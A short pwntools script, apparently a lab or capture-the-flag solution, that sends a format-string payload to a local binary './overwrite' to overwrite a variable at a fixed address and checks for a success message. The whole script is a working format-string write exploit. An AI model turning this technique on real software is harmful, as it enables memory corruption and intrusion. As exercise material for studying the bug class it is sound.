from pwn import *
p = process("./overwrite")
p.recvline()
a_addr = 0x0804A024
payload = fmtstr_payload(6,{a_addr:2})
print payload
p.sendline(payload)
info = p.recv()
if "modified a" in info:
	print "success"
